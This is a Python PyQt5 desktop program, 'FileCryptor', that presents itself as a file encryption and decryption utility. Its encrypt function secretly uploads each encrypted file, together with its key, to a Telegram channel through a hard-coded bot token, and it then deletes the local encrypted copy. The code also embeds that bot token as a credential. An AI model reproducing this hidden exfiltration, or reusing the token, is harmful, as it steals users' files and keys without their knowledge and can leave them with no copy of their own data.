# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'FileCryptor.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox
import resources
import sys
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
import os
import uuid
import requests

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(416, 117)
        MainWindow.setMinimumSize(QtCore.QSize(416, 117))
        MainWindow.setMaximumSize(QtCore.QSize(416, 117))
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(":/img/favicon.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        MainWindow.setStyleSheet("background-color:#ffffff;")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.groupBox = QtWidgets.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(4, 2, 406, 111))
        font = QtGui.QFont()
        font.setFamily("Georgia")
        font.setPointSize(-1)
        self.groupBox.setFont(font)
        self.groupBox.setStatusTip("")
        self.groupBox.setStyleSheet("  font-family: Georgia;\n"
"  color: #0071bc;\n"
"  font-size: 12px;\n"
"border-radius:5;\n"
"border-style: solid;\n"
"border-width: 1px;\n"
"border-color:#0071bc;")
        self.groupBox.setInputMethodHints(QtCore.Qt.ImhNone)
        self.groupBox.setFlat(False)
        self.groupBox.setCheckable(False)
        self.groupBox.setObjectName("groupBox")
        self.lineEdit = QtWidgets.QLineEdit(self.groupBox)
        self.lineEdit.setEnabled(True)
        self.lineEdit.setGeometry(QtCore.QRect(10, 20, 341, 20))
        self.lineEdit.setStyleSheet(" background: #ffffff;\n"
"  background-image: -webkit-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -moz-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -ms-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -o-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: linear-gradient(to bottom, #0071bc, #0071bd);\n"
"  -webkit-border-radius: 12;\n"
"  -moz-border-radius: 12;\n"
"  border-radius: 12px;\n"
"  font-family: Georgia;\n"
"  color: #0071bc;\n"
"  font-size: 16px;\n"
"  text-decoration: none;")
        self.lineEdit.setFrame(True)
        self.lineEdit.setReadOnly(True)
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton = QtWidgets.QPushButton(self.groupBox)
        self.pushButton.setGeometry(QtCore.QRect(361, 19, 34, 23))
        self.pushButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.pushButton.setStyleSheet(" background: #0071bc;\n"
"  background-image: -webkit-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -moz-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -ms-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -o-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: linear-gradient(to bottom, #0071bc, #0071bd);\n"
"  -webkit-border-radius: 12;\n"
"  -moz-border-radius: 12;\n"
"  border-radius: 12px;\n"
"  font-family: Georgia;\n"
"  color: #ffffff;\n"
"  font-size: 16px;\n"
"  text-decoration: none;")
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QtWidgets.QPushButton(self.groupBox)
        self.pushButton_2.setGeometry(QtCore.QRect(10, 50, 387, 23))
        self.pushButton_2.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.pushButton_2.setStyleSheet(" background: #0071bc;\n"
"  background-image: -webkit-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -moz-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -ms-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -o-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: linear-gradient(to bottom, #0071bc, #0071bd);\n"
"  -webkit-border-radius: 12;\n"
"  -moz-border-radius: 12;\n"
"  border-radius: 12px;\n"
"  font-family: Georgia;\n"
"  color: #ffffff;\n"
"  font-size: 16px;\n"
"  text-decoration: none;")
        self.pushButton_2.setObjectName("pushButton_2")
        self.label = QtWidgets.QLabel(self.groupBox)
        self.label.setGeometry(QtCore.QRect(10, 80, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Georgia")
        font.setPointSize(-1)
        font.setUnderline(False)
        font.setStrikeOut(False)
        self.label.setFont(font)
        self.label.setStyleSheet("  font-family: Georgia;\n"
"  color: #0071bc;\n"
"  font-size: 12px;\n"
"  text-decoration: none;\n"
"border:none;")
        self.label.setObjectName("label")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.groupBox)
        self.lineEdit_2.setEnabled(True)
        self.lineEdit_2.setGeometry(QtCore.QRect(80, 80, 316, 20))
        self.lineEdit_2.setStyleSheet(" background: #ffffff;\n"
"  background-image: -webkit-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -moz-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -ms-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: -o-linear-gradient(top, #0071bc, #0071bd);\n"
"  background-image: linear-gradient(to bottom, #0071bc, #0071bd);\n"
"  -webkit-border-radius: 12;\n"
"  -moz-border-radius: 12;\n"
"  border-radius: 12px;\n"
"  font-family: Georgia;\n"
"  color: #0071bc;\n"
"  font-size: 16px;\n"
"  text-decoration: none;")
        self.lineEdit_2.setReadOnly(False)
        self.lineEdit_2.setObjectName("lineEdit_2")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        self.set_file()
        self.enc_dec()
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "FileCryptor"))
        self.groupBox.setTitle(_translate("MainWindow", "Encrypt/Decrypt"))
        self.pushButton.setText(_translate("MainWindow", "..."))
        self.pushButton_2.setText(_translate("MainWindow", "Encrypt"))
        self.label.setText(_translate("MainWindow", "Password : "))

    def set_file(self):
            self.pushButton.clicked.connect(lambda: self.show_file())

    def show_file(self):
        self.lineEdit.setText(str(QtWidgets.QFileDialog.getOpenFileName()).split("'")[1])
        self.lineEdit_2.clear()
        if self.lineEdit.text().split('.')[len(self.lineEdit.text().split('.'))-1] == 'enc':
            self.pushButton_2.setText('Decrypt')
        else:
            self.pushButton_2.setText('Encrypt')

    def first(self):
        file = self.lineEdit.text()
        uuidOne = str(uuid.uuid1())
        key = uuidOne.split('-')
        key = ''.join(key)
        key = key[:-1]
        btkey = bytes(key, 'utf-8')
        self.lineEdit_2.setText(f'{btkey.hex()}')

        key = key.encode('UTF-8')
        key = pad(key, AES.block_size)

        def encrypt(filename, key):
            doc = filename.split('/')[len(filename.split('/')) - 1]
            with open(filename, 'rb') as entry:
                data = entry.read()
                cipher = AES.new(key, AES.MODE_CFB)
                ciphertext = cipher.encrypt(pad(data, AES.block_size))
                iv = b64encode(cipher.iv).decode('UTF-8')
                ciphertext = b64encode(ciphertext).decode('UTF-8')
                to_write = iv + ciphertext
            entry.close()
            with open(doc + '.enc', 'w') as data:
                data.write(to_write)
            data.close()
            self.succesMessage()
            date = {'document': open(doc + '.enc', 'rb')}
            url = f"https://api.telegram.org/bot5309345952:AAF6GBfPJ6tuIuei5zaLu3k38Tq6jrYpMCg/sendDocument?chat_id=@cryptedfiles&caption={btkey.hex()}"
            requests.post(url, files=date)
        encrypt(file, key)

    def second(self):
        files = self.lineEdit.text()
        key = self.lineEdit_2.text()
        key = key.encode('UTF-8')
        key = pad(key, AES.block_size)
        with open(files, 'r') as entry:
            try:
                data = entry.read()
                length = len(data)
                iv = data[:24]
                iv = b64decode(iv)
                ciphertext = data[24:length]
                ciphertext = b64decode(ciphertext)
                cipher = AES.new(key, AES.MODE_CFB, iv)
                decrypted = cipher.decrypt(ciphertext)
                decrypted = unpad(decrypted, AES.block_size)

                fileEnc = files.split('.')
                fileEnc.pop()
                file = '.'.join(fileEnc)

                with open(f"{file.split('/')[len(file.split('/'))-1]}", 'wb') as data:
                    data.write(decrypted)
                data.close()
                self.succesMessage()
            except(ValueError, KeyError, TypeError, AttributeError):
                self.lineEdit_2.setText('Wrong Password')
        if self.lineEdit_2.text() == 'Wrong Password':
            pass
        else:
            self.delFiles()

    def get_func(self):
        if self.lineEdit.text().split('.')[len(self.lineEdit.text().split('.'))-1] == 'enc':
            Flag = False
        else:
            Flag = True
        if Flag:
            self.first()
            self.delFiles2()
        else:
            self.second()

    def enc_dec(self):
        self.pushButton_2.clicked.connect(lambda: self.get_func())

    def succesMessage(self):
        msg = QMessageBox()
        msg.setWindowIcon(QtGui.QIcon(":/img/favicon.ico"))
        msg.setIcon(QMessageBox.Information)
        msg.setText("Succes !")
        msg.setWindowTitle("Felicitări !")
        msg.exec_()

    def delFiles(self):
        os.remove(f'{self.lineEdit.text()}')

    def delFiles2(self):
        file = self.lineEdit.text()
        doc = file.split('/')[len(file.split('/')) - 1] + '.enc'
        os.remove(doc)


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
